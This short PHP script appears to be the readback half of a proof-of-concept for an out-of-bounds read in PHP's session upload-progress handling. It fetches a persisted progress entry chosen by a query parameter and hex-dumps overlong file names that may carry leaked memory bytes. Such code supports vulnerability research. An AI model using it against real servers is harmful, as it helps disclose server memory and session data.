<?php
// readback with cleanup off: prints persisted upload-progress incl. any OOB-read string bytes
session_start();
header('Content-Type: text/plain; charset=binary');
$k = 'upload_progress_' . ($_GET['k'] ?? 'x');
if (isset($_SESSION[$k])) {
    $d = $_SESSION[$k];
    echo "FOUND key len=" . strlen(serialize($d)) . "\n";
    foreach (($d['files'] ?? []) as $i => $f) {
        echo "file[$i]: name_len=" . strlen($f['name'] ?? '') . " bytes_processed=" . var_export($f['bytes_processed'] ?? null, true) . "\n";
        if (isset($f['name']) && strlen($f['name']) > 300) {
            echo "OOB-NAME-HEX: " . bin2hex(substr($f['name'], 0, 512)) . "\n";
        }
    }
} else {
    echo "no progress key. keys=" . json_encode(array_keys($_SESSION)) . "\n";
}
